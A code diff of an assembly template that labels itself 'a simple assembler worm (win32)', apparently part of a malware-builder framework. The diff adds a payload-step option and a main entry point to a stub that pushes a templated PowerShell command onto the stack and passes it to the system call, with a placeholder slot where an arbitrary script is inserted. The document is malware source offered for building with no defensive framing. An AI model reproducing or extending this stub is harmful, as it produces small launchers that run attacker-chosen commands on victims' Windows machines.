@@ -2,17 +2,22 @@
 #!types##worm
 #!info##A simple assembler worm (win32). Runs a powershell script. Places the code on the stack. It does not include DLL libraries in the executable file which makes it very small.
 #!reqPayload##LIL_pscript##PowerShell script to execute##STACK_BUILD:True##STACK_COMMAND:powershell.exe -Command "$"
+#!payStep##asm_stack_build
+#!payloadOpt##LIL_pscript##asm_stack_build_cmd##powershell.exe -Command "$"
 #!lang##asm
 #!banned##module##starter##shadow##junk
 #!system_FLAG##[W]
-#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##COMPILER##mingw-x32##Compiler name
 #!globalVar##OS_EXEC##win##Target system executable
 #!processWorm##BasicAsm
-#!globalVar##COMPILER_NO_DLL##Not include DLLs
+#!globalVar##NO_DLL##Not include DLLs
 
 extern _ExitProcess@4
 extern _system
 
+section .text
+global main
+main:
     push dword 0x00000000
     {{LIL_pscript}}
     push esp
